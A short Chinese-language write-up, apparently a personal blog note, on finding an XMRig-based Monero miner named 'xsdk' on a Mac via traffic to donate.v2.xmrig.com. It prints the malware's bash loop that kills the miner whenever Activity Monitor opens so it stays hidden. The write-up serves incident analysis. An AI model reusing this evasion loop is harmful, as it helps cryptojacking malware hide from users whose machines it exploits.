# mac下xsdk矿工


# 发现
 公司安全通知我的电脑多次访问门罗币的IP

    donate.v2.xmrig.com

# 查找

下载一个Radio Silence软件 
发现了一个`xsdk`的进程在请求门罗币的地址

# 分析

暂时不知道因为安装哪个破解软件被种下的脚本， 之前在活动监视器里查能耗一直没发现异常，现在看一眼脚本才知道。
原来打开活动监视器的时候会kill自己的进程， 然后过一段时间在唤醒自己。
```shell

☁  mach_inlt  ps aux | grep xsdk
root               244   0.1  0.0  4279904   1556   ??  S    11:24上午   0:09.61 ./khdjs -c #!/bin/bash\012a=1\012while a=1\012do\012jkqpid=(`ps -ef|grep Activity\ Monitor.app |awk '$0 !~/grep/ {print $2}'`)\012if [ $jkqpid != null ] ; then\012kill -9 $(ps -ef|grep xsdk |awk '$0 !~/grep/ {print $2}')\012fi\012sleep 1\012\012done\012\012 ./khdjs
```
